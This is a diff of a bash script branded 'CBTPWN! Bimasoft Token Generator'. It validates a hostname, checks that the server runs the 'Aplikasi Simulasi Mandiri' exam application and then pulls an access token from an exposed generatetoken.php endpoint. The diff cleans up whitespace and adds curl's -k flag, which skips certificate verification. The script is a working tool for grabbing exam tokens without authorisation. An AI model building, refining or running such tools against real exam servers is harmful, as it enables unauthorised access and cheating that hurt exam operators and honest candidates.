@@ -12,7 +12,7 @@
 
 # Welcome message
 echo -ne "CBTPWN! Bimasoft Token Generator
- _______  _______  _______  _______  _     _  __    _ 
+ _______  _______  _______  _______  _     _  __    _
 |       ||  _    ||       ||       || | _ | ||  |  | |
 |       || |_|   ||_     _||    _  || || || ||   |_| |
 |       ||       |  |   |  |   |_| ||       ||       |
@@ -34,18 +34,18 @@ if [ $# -eq 0 ]
     exit 1
 fi
 
-# Check if server is valid 
+# Check if server is valid
 if [[  $(echo $@ | grep -P '(?=^.{5,254}$)(^(?:(?!\d+\.)[a-zA-Z0-9_\-]{1,63}\.?)+(?:[a-zA-Z]{2,})$)') ]]
     then
       echo -ne "\nServer: $@"
     else
       echo -e "\nInvalid server, make sure it's correct!"
       exit 1
-fi 
+fi
 
 # Check if Aplikasi Simulasi Mandiri is supported
 echo -ne "\nChecking server version..."
-if [[ $(curl -s "https://$@/" | grep "Aplikasi Simulasi Mandiri") ]]
+if [[ $(curl -s -k "https://$@/" | grep "Aplikasi Simulasi Mandiri") ]]
     then
       echo -ne "\nServer is valid, continue"
     else
@@ -54,7 +54,7 @@ if [[ $(curl -s "https://$@/" | grep "Aplikasi Simulasi Mandiri") ]]
 fi
 
 echo -ne "\nConnecting to $@\n\n\n"
-IFS="-" read -a array <<< $(curl -s "https://$@/wp-content/themes/unbk/api-18575621/generatetoken.php")
+IFS="-" read -a array <<< $(curl -s -k "https://$@/wp-content/themes/unbk/api-18575621/generatetoken.php")
 echo -ne " Token : ${array[0]}\n\n"
 echo -ne "${array[1]}-"
 echo -ne "${array[2]}-"
